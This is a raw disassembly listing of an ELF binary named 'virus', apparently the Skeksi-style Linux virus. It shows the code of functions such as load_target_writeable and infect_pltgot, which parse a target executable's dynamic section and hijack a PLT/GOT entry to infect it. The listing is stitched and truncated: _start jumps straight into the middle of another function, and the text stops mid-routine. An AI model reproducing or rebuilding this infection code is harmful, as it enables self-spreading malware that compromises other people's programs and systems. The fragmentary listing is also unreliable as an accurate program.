
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  401515:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40151c:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401520:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401523:	48 63 d0             	movsxd rdx,eax
  401526:	48 89 d0             	mov    rax,rdx
  401529:	48 c1 e0 03          	shl    rax,0x3
  40152d:	48 29 d0             	sub    rax,rdx
  401530:	48 c1 e0 03          	shl    rax,0x3
  401534:	48 01 c8             	add    rax,rcx
  401537:	8b 00                	mov    eax,DWORD PTR [rax]
  401539:	83 f8 01             	cmp    eax,0x1
  40153c:	74 0e                	je     40154c <load_target_writeable+0x187>
  40153e:	83 f8 02             	cmp    eax,0x2
  401541:	0f 84 3f 01 00 00    	je     401686 <load_target_writeable+0x2c1>
  401547:	e9 7b 01 00 00       	jmp    4016c7 <load_target_writeable+0x302>
  40154c:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401553:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401557:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40155a:	48 63 d0             	movsxd rdx,eax
  40155d:	48 89 d0             	mov    rax,rdx
  401560:	48 c1 e0 03          	shl    rax,0x3
  401564:	48 29 d0             	sub    rax,rdx
  401567:	48 c1 e0 03          	shl    rax,0x3
  40156b:	48 01 c8             	add    rax,rcx
  40156e:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401572:	48 85 c0             	test   rax,rax
  401575:	0f 95 c0             	setne  al
  401578:	0f b6 c0             	movzx  eax,al
  40157b:	85 c0                	test   eax,eax
  40157d:	74 0a                	je     401589 <load_target_writeable+0x1c4>
  40157f:	83 f8 01             	cmp    eax,0x1
  401582:	74 6c                	je     4015f0 <load_target_writeable+0x22b>
  401584:	e9 3e 01 00 00       	jmp    4016c7 <load_target_writeable+0x302>
  401589:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401590:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401594:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401597:	48 63 d0             	movsxd rdx,eax
  40159a:	48 89 d0             	mov    rax,rdx
  40159d:	48 c1 e0 03          	shl    rax,0x3
  4015a1:	48 29 d0             	sub    rax,rdx
  4015a4:	48 c1 e0 03          	shl    rax,0x3
  4015a8:	48 01 c8             	add    rax,rcx
  4015ab:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  4015af:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015b6:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  4015ba:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015c1:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015c5:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015c8:	48 63 d0             	movsxd rdx,eax
  4015cb:	48 89 d0             	mov    rax,rdx
  4015ce:	48 c1 e0 03          	shl    rax,0x3
  4015d2:	48 29 d0             	sub    rax,rdx
  4015d5:	48 c1 e0 03          	shl    rax,0x3
  4015d9:	48 01 c8             	add    rax,rcx
  4015dc:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  4015e0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015e7:	48 89 50 30          	mov    QWORD PTR [rax+0x30],rdx
  4015eb:	e9 94 00 00 00       	jmp    401684 <load_target_writeable+0x2bf>
  4015f0:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4015f7:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  4015fb:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  4015fe:	48 63 d0             	movsxd rdx,eax
  401601:	48 89 d0             	mov    rax,rdx
  401604:	48 c1 e0 03          	shl    rax,0x3
  401608:	48 29 d0             	sub    rax,rdx
  40160b:	48 c1 e0 03          	shl    rax,0x3
  40160f:	48 01 c8             	add    rax,rcx
  401612:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  401616:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40161d:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  401621:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401628:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40162c:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40162f:	48 63 d0             	movsxd rdx,eax
  401632:	48 89 d0             	mov    rax,rdx
  401635:	48 c1 e0 03          	shl    rax,0x3
  401639:	48 29 d0             	sub    rax,rdx
  40163c:	48 c1 e0 03          	shl    rax,0x3
  401640:	48 01 c8             	add    rax,rcx
  401643:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  401647:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40164e:	48 89 50 38          	mov    QWORD PTR [rax+0x38],rdx
  401652:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401659:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40165d:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  401660:	48 63 d0             	movsxd rdx,eax
  401663:	48 89 d0             	mov    rax,rdx
  401666:	48 c1 e0 03          	shl    rax,0x3
  40166a:	48 29 d0             	sub    rax,rdx
  40166d:	48 c1 e0 03          	shl    rax,0x3
  401671:	48 01 c8             	add    rax,rcx
  401674:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  401678:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40167f:	48 89 50 40          	mov    QWORD PTR [rax+0x40],rdx
  401683:	90                   	nop
  401684:	eb 41                	jmp    4016c7 <load_target_writeable+0x302>
  401686:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40168d:	48 8b 48 50          	mov    rcx,QWORD PTR [rax+0x50]
  401691:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  401698:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  40169c:	8b 45 ec             	mov    eax,DWORD PTR [rbp-0x14]
  40169f:	48 63 d0             	movsxd rdx,eax
  4016a2:	48 89 d0             	mov    rax,rdx
  4016a5:	48 c1 e0 03          	shl    rax,0x3
  4016a9:	48 29 d0             	sub    rax,rdx
  4016ac:	48 c1 e0 03          	shl    rax,0x3
  4016b0:	48 01 f0             	add    rax,rsi
  4016b3:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4016b7:	48 8d 14 01          	lea    rdx,[rcx+rax*1]
  4016bb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016c2:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  4016c6:	90                   	nop
  4016c7:	83 45 ec 01          	add    DWORD PTR [rbp-0x14],0x1
  4016cb:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016d2:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4016d5:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  4016d9:	0f b7 c0             	movzx  eax,ax
  4016dc:	39 45 ec             	cmp    DWORD PTR [rbp-0x14],eax
  4016df:	0f 8c 30 fe ff ff    	jl     401515 <load_target_writeable+0x150>
  4016e5:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4016ec:	48 8b 8d 50 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xb0]
  4016f3:	48 8b 9d 58 ff ff ff 	mov    rbx,QWORD PTR [rbp-0xa8]
  4016fa:	48 89 48 68          	mov    QWORD PTR [rax+0x68],rcx
  4016fe:	48 89 58 70          	mov    QWORD PTR [rax+0x70],rbx
  401702:	48 8b 8d 60 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xa0]
  401709:	48 8b 9d 68 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x98]
  401710:	48 89 48 78          	mov    QWORD PTR [rax+0x78],rcx
  401714:	48 89 98 80 00 00 00 	mov    QWORD PTR [rax+0x80],rbx
  40171b:	48 8b 8d 70 ff ff ff 	mov    rcx,QWORD PTR [rbp-0x90]
  401722:	48 8b 9d 78 ff ff ff 	mov    rbx,QWORD PTR [rbp-0x88]
  401729:	48 89 88 88 00 00 00 	mov    QWORD PTR [rax+0x88],rcx
  401730:	48 89 98 90 00 00 00 	mov    QWORD PTR [rax+0x90],rbx
  401737:	48 8b 4d 80          	mov    rcx,QWORD PTR [rbp-0x80]
  40173b:	48 8b 5d 88          	mov    rbx,QWORD PTR [rbp-0x78]
  40173f:	48 89 88 98 00 00 00 	mov    QWORD PTR [rax+0x98],rcx
  401746:	48 89 98 a0 00 00 00 	mov    QWORD PTR [rax+0xa0],rbx
  40174d:	48 8b 4d 90          	mov    rcx,QWORD PTR [rbp-0x70]
  401751:	48 8b 5d 98          	mov    rbx,QWORD PTR [rbp-0x68]
  401755:	48 89 88 a8 00 00 00 	mov    QWORD PTR [rax+0xa8],rcx
  40175c:	48 89 98 b0 00 00 00 	mov    QWORD PTR [rax+0xb0],rbx
  401763:	48 8b 4d a0          	mov    rcx,QWORD PTR [rbp-0x60]
  401767:	48 8b 5d a8          	mov    rbx,QWORD PTR [rbp-0x58]
  40176b:	48 89 88 b8 00 00 00 	mov    QWORD PTR [rax+0xb8],rcx
  401772:	48 89 98 c0 00 00 00 	mov    QWORD PTR [rax+0xc0],rbx
  401779:	48 8b 4d b0          	mov    rcx,QWORD PTR [rbp-0x50]
  40177d:	48 8b 5d b8          	mov    rbx,QWORD PTR [rbp-0x48]
  401781:	48 89 88 c8 00 00 00 	mov    QWORD PTR [rax+0xc8],rcx
  401788:	48 89 98 d0 00 00 00 	mov    QWORD PTR [rax+0xd0],rbx
  40178f:	48 8b 4d c0          	mov    rcx,QWORD PTR [rbp-0x40]
  401793:	48 8b 5d c8          	mov    rbx,QWORD PTR [rbp-0x38]
  401797:	48 89 88 d8 00 00 00 	mov    QWORD PTR [rax+0xd8],rcx
  40179e:	48 89 98 e0 00 00 00 	mov    QWORD PTR [rax+0xe0],rbx
  4017a5:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  4017a9:	48 8b 5d d8          	mov    rbx,QWORD PTR [rbp-0x28]
  4017ad:	48 89 88 e8 00 00 00 	mov    QWORD PTR [rax+0xe8],rcx
  4017b4:	48 89 98 f0 00 00 00 	mov    QWORD PTR [rax+0xf0],rbx
  4017bb:	48 8b 45 80          	mov    rax,QWORD PTR [rbp-0x80]
  4017bf:	48 89 c2             	mov    rdx,rax
  4017c2:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  4017c9:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  4017cd:	b8 00 00 00 00       	mov    eax,0x0
  4017d2:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
  4017d9:	5b                   	pop    rbx
  4017da:	5d                   	pop    rbp
  4017db:	c3                   	ret    

00000000004017dc <infect_pltgot>:
  4017dc:	f3 0f 1e fa          	endbr64 
  4017e0:	55                   	push   rbp
  4017e1:	48 89 e5             	mov    rbp,rsp
  4017e4:	48 83 ec 70          	sub    rsp,0x70
  4017e8:	48 89 7d 98          	mov    QWORD PTR [rbp-0x68],rdi
  4017ec:	48 89 75 90          	mov    QWORD PTR [rbp-0x70],rsi
  4017f0:	c7 45 b4 00 00 00 00 	mov    DWORD PTR [rbp-0x4c],0x0
  4017f7:	c7 45 f8 ff ff ff ff 	mov    DWORD PTR [rbp-0x8],0xffffffff
  4017fe:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401802:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  401806:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  40180a:	48 c7 45 c0 00 00 00 	mov    QWORD PTR [rbp-0x40],0x0
  401811:	00 
  401812:	48 c7 45 b8 00 00 00 	mov    QWORD PTR [rbp-0x48],0x0
  401819:	00 
  40181a:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401821:	e9 67 01 00 00       	jmp    40198d <infect_pltgot+0x1b1>
  401826:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401829:	48 98                	cdqe   
  40182b:	48 c1 e0 04          	shl    rax,0x4
  40182f:	48 89 c2             	mov    rdx,rax
  401832:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  401836:	48 01 d0             	add    rax,rdx
  401839:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40183c:	48 83 f8 17          	cmp    rax,0x17
  401840:	0f 87 43 01 00 00    	ja     401989 <infect_pltgot+0x1ad>
  401846:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  40184d:	00 
  40184e:	48 8d 05 db 15 00 00 	lea    rax,[rip+0x15db]        # 402e30 <display_skeksi+0xb2>
  401855:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  401858:	48 98                	cdqe   
  40185a:	48 8d 15 cf 15 00 00 	lea    rdx,[rip+0x15cf]        # 402e30 <display_skeksi+0xb2>
  401861:	48 01 d0             	add    rax,rdx
  401864:	3e ff e0             	notrack jmp rax
  401867:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40186b:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40186f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401872:	48 98                	cdqe   
  401874:	48 c1 e0 04          	shl    rax,0x4
  401878:	48 89 c1             	mov    rcx,rax
  40187b:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40187f:	48 01 c8             	add    rax,rcx
  401882:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401886:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40188a:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40188e:	48 29 c1             	sub    rcx,rax
  401891:	48 89 c8             	mov    rax,rcx
  401894:	48 01 d0             	add    rax,rdx
  401897:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40189b:	e9 e9 00 00 00       	jmp    401989 <infect_pltgot+0x1ad>
  4018a0:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018a4:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018a8:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018ac:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  4018b0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018b3:	48 98                	cdqe   
  4018b5:	48 c1 e0 04          	shl    rax,0x4
  4018b9:	48 89 c6             	mov    rsi,rax
  4018bc:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018c0:	48 01 f0             	add    rax,rsi
  4018c3:	48 8b 70 08          	mov    rsi,QWORD PTR [rax+0x8]
  4018c7:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018cb:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  4018cf:	48 29 c6             	sub    rsi,rax
  4018d2:	48 89 f0             	mov    rax,rsi
  4018d5:	48 01 c8             	add    rax,rcx
  4018d8:	48 01 d0             	add    rax,rdx
  4018db:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  4018df:	e9 a5 00 00 00       	jmp    401989 <infect_pltgot+0x1ad>
  4018e4:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  4018e8:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  4018ec:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4018ef:	48 98                	cdqe   
  4018f1:	48 c1 e0 04          	shl    rax,0x4
  4018f5:	48 89 c1             	mov    rcx,rax
  4018f8:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  4018fc:	48 01 c8             	add    rax,rcx
  4018ff:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401903:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401907:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40190b:	48 29 c1             	sub    rcx,rax
  40190e:	48 89 c8             	mov    rax,rcx
  401911:	48 01 d0             	add    rax,rdx
  401914:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  401918:	eb 6f                	jmp    401989 <infect_pltgot+0x1ad>
  40191a:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  40191d:	48 98                	cdqe   
  40191f:	48 c1 e0 04          	shl    rax,0x4
  401923:	48 89 c2             	mov    rdx,rax
  401926:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40192a:	48 01 d0             	add    rax,rdx
  40192d:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401931:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  401935:	eb 52                	jmp    401989 <infect_pltgot+0x1ad>
  401937:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40193b:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  40193f:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401942:	48 98                	cdqe   
  401944:	48 c1 e0 04          	shl    rax,0x4
  401948:	48 89 c1             	mov    rcx,rax
  40194b:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40194f:	48 01 c8             	add    rax,rcx
  401952:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  401956:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  40195a:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  40195e:	48 29 c1             	sub    rcx,rax
  401961:	48 89 c8             	mov    rax,rcx
  401964:	48 01 d0             	add    rax,rdx
  401967:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40196b:	eb 1c                	jmp    401989 <infect_pltgot+0x1ad>
  40196d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401970:	48 98                	cdqe   
  401972:	48 c1 e0 04          	shl    rax,0x4
  401976:	48 89 c2             	mov    rdx,rax
  401979:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40197d:	48 01 d0             	add    rax,rdx
  401980:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401984:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  401988:	90                   	nop
  401989:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  40198d:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401990:	48 98                	cdqe   
  401992:	48 c1 e0 04          	shl    rax,0x4
  401996:	48 89 c2             	mov    rdx,rax
  401999:	48 8b 45 a8          	mov    rax,QWORD PTR [rbp-0x58]
  40199d:	48 01 d0             	add    rax,rdx
  4019a0:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4019a3:	48 85 c0             	test   rax,rax
  4019a6:	0f 85 7a fe ff ff    	jne    401826 <infect_pltgot+0x4a>
  4019ac:	48 83 7d f0 00       	cmp    QWORD PTR [rbp-0x10],0x0
  4019b1:	74 07                	je     4019ba <infect_pltgot+0x1de>
  4019b3:	48 83 7d e0 00       	cmp    QWORD PTR [rbp-0x20],0x0
  4019b8:	75 0a                	jne    4019c4 <infect_pltgot+0x1e8>
  4019ba:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4019bf:	e9 af 01 00 00       	jmp    401b73 <infect_pltgot+0x397>
  4019c4:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4019cb:	eb 47                	jmp    401a14 <infect_pltgot+0x238>
  4019cd:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4019d0:	48 63 d0             	movsxd rdx,eax
  4019d3:	48 89 d0             	mov    rax,rdx
  4019d6:	48 01 c0             	add    rax,rax
  4019d9:	48 01 d0             	add    rax,rdx
  4019dc:	48 c1 e0 03          	shl    rax,0x3
  4019e0:	48 89 c2             	mov    rdx,rax
  4019e3:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4019e7:	48 01 d0             	add    rax,rdx
  4019ea:	8b 00                	mov    eax,DWORD PTR [rax]
  4019ec:	89 c2                	mov    edx,eax
  4019ee:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4019f2:	48 01 d0             	add    rax,rdx
  4019f5:	48 8d 35 2c 14 00 00 	lea    rsi,[rip+0x142c]        # 402e28 <display_skeksi+0xaa>
  4019fc:	48 89 c7             	mov    rdi,rax
  4019ff:	e8 85 12 00 00       	call   402c89 <_strcmp>
  401a04:	85 c0                	test   eax,eax
  401a06:	75 08                	jne    401a10 <infect_pltgot+0x234>
  401a08:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a0b:	89 45 f8             	mov    DWORD PTR [rbp-0x8],eax
  401a0e:	eb 2b                	jmp    401a3b <infect_pltgot+0x25f>
  401a10:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401a14:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a17:	48 63 d0             	movsxd rdx,eax
  401a1a:	48 89 d0             	mov    rax,rdx
  401a1d:	48 01 c0             	add    rax,rax
  401a20:	48 01 d0             	add    rax,rdx
  401a23:	48 c1 e0 03          	shl    rax,0x3
  401a27:	48 89 c2             	mov    rdx,rax
  401a2a:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a2e:	48 01 d0             	add    rax,rdx
  401a31:	8b 00                	mov    eax,DWORD PTR [rax]
  401a33:	89 c0                	mov    eax,eax
  401a35:	48 39 45 d0          	cmp    QWORD PTR [rbp-0x30],rax
  401a39:	73 92                	jae    4019cd <infect_pltgot+0x1f1>
  401a3b:	83 7d f8 ff          	cmp    DWORD PTR [rbp-0x8],0xffffffff
  401a3f:	75 0a                	jne    401a4b <infect_pltgot+0x26f>
  401a41:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401a46:	e9 28 01 00 00       	jmp    401b73 <infect_pltgot+0x397>
  401a4b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  401a52:	e9 c4 00 00 00       	jmp    401b1b <infect_pltgot+0x33f>
  401a57:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401a5a:	48 63 d0             	movsxd rdx,eax
  401a5d:	48 89 d0             	mov    rax,rdx
  401a60:	48 01 c0             	add    rax,rax
  401a63:	48 01 d0             	add    rax,rdx
  401a66:	48 c1 e0 03          	shl    rax,0x3
  401a6a:	48 89 c2             	mov    rdx,rax
  401a6d:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401a71:	48 01 d0             	add    rax,rdx
  401a74:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  401a78:	48 c1 e8 20          	shr    rax,0x20
  401a7c:	48 89 c2             	mov    rdx,rax
  401a7f:	48 89 d0             	mov    rax,rdx
  401a82:	48 01 c0             	add    rax,rax
  401a85:	48 01 d0             	add    rax,rdx
  401a88:	48 c1 e0 03          	shl    rax,0x3
  401a8c:	48 89 c2             	mov    rdx,rax
  401a8f:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  401a93:	48 01 d0             	add    rax,rdx
  401a96:	8b 00                	mov    eax,DWORD PTR [rax]
  401a98:	89 c2                	mov    edx,eax
  401a9a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  401a9e:	48 01 d0             	add    rax,rdx
  401aa1:	48 8d 35 80 13 00 00 	lea    rsi,[rip+0x1380]        # 402e28 <display_skeksi+0xaa>
  401aa8:	48 89 c7             	mov    rdi,rax
  401aab:	e8 d9 11 00 00       	call   402c89 <_strcmp>
  401ab0:	85 c0                	test   eax,eax
  401ab2:	75 63                	jne    401b17 <infect_pltgot+0x33b>
  401ab4:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ab7:	48 63 d0             	movsxd rdx,eax
  401aba:	48 89 d0             	mov    rax,rdx
  401abd:	48 01 c0             	add    rax,rax
  401ac0:	48 01 d0             	add    rax,rdx
  401ac3:	48 c1 e0 03          	shl    rax,0x3
  401ac7:	48 89 c2             	mov    rdx,rax
  401aca:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401ace:	48 01 d0             	add    rax,rdx
  401ad1:	48 8b 00             	mov    rax,QWORD PTR [rax]
  401ad4:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401ad8:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401adc:	48 8b 48 40          	mov    rcx,QWORD PTR [rax+0x40]
  401ae0:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401ae3:	48 63 d0             	movsxd rdx,eax
  401ae6:	48 89 d0             	mov    rax,rdx
  401ae9:	48 01 c0             	add    rax,rax
  401aec:	48 01 d0             	add    rax,rdx
  401aef:	48 c1 e0 03          	shl    rax,0x3
  401af3:	48 89 c2             	mov    rdx,rax
  401af6:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  401afa:	48 01 d0             	add    rax,rdx
  401afd:	48 8b 10             	mov    rdx,QWORD PTR [rax]
  401b00:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b04:	48 8b 40 28          	mov    rax,QWORD PTR [rax+0x28]
  401b08:	48 29 c2             	sub    rdx,rax
  401b0b:	48 89 d0             	mov    rax,rdx
  401b0e:	48 01 c8             	add    rax,rcx
  401b11:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  401b15:	eb 2b                	jmp    401b42 <infect_pltgot+0x366>
  401b17:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401b1b:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  401b1e:	48 63 c8             	movsxd rcx,eax
  401b21:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  401b25:	48 ba ab aa aa aa aa 	movabs rdx,0xaaaaaaaaaaaaaaab
  401b2c:	aa aa aa 
  401b2f:	48 f7 e2             	mul    rdx
  401b32:	48 89 d0             	mov    rax,rdx
  401b35:	48 c1 e8 04          	shr    rax,0x4
  401b39:	48 39 c1             	cmp    rcx,rax
  401b3c:	0f 82 15 ff ff ff    	jb     401a57 <infect_pltgot+0x27b>
  401b42:	48 83 7d c0 00       	cmp    QWORD PTR [rbp-0x40],0x0
  401b47:	75 07                	jne    401b50 <infect_pltgot+0x374>
  401b49:	b8 ff ff ff ff       	mov    eax,0xffffffff
  401b4e:	eb 23                	jmp    401b73 <infect_pltgot+0x397>
  401b50:	48 8b 45 98          	mov    rax,QWORD PTR [rbp-0x68]
  401b54:	48 8b 50 50          	mov    rdx,QWORD PTR [rax+0x50]
  401b58:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  401b5c:	48 01 d0             	add    rax,rdx
  401b5f:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401b63:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  401b67:	48 8b 55 90          	mov    rdx,QWORD PTR [rbp-0x70]
